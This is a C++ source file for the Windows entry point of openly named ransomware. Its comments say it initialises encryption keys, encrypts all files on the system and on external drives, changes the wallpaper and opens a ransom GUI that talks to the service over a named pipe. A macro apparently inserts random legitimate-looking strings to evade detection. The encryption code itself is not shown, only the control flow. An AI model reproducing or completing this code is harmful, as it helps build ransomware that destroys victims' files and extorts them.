#include <windows.h>
#include <iostream>
#include <fstream>
#include <memory>

#include "ServiceWorker.hpp"
#include "..\..\include\include.hpp"


int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) 
{
	dbg::initLogs();

	INSERT_RND_LEGIT_STR;

	auto& worker = ServiceWorker::getInstance();
	auto comsServer = std::make_unique<NamedPipeServer>("RAwarePipeComs");

	// Initialize communication with GUI
	if (not comsServer->create())
	{
		DBG_PRINT("Failed to create named pipe");
		utils::stopAndExit(EXIT_FAILURE);
	}

	// Initialize encryption keys and setup user data resources
	worker.init();

	// Encrypting all files on the system and external drives
	const auto drives = worker.getDrives();
	worker.encryptAllFiles(drives);

	// Set wallpaper
	worker.setWallpaper();

	// Open ransom GUI after encryption
	worker.openGUI();

	// Wait for GUI to connect
	if (not comsServer->connect())
	{
		DBG_PRINT("Failed to connect to named pipe");
		utils::stopAndExit(EXIT_FAILURE);
	}

	// Handle messages from GUI
	worker.handleServerComs(std::move(comsServer));

	utils::stopAndExit(EXIT_SUCCESS);
}